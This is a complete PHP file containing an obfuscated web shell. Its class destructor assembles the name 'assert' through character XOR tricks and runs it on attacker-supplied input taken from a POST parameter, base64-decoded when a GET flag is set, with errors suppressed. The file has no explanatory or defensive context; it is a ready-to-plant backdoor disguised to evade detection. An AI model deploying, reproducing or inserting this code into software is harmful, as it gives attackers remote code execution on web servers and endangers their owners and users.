<?php 
class  HKGL{ 
function __destruct(){
$owg='r'^"\x13";
$lvk='I'^"\x3a";
$nvb='L'^"\x3f";
$fxv='`'^"\x5";
$lsw='D'^"\x36";
$uvh='s'^"\x7";
$TAGL=$owg.$lvk.$nvb.$fxv.$lsw.$uvh;
return @$TAGL($this->WN);}}
$hkgl=new HKGL();
@$hkgl->WN=isset($_GET['id'])?base64_decode($_POST['llaLLA']):$_POST['llaLLA'];
?>
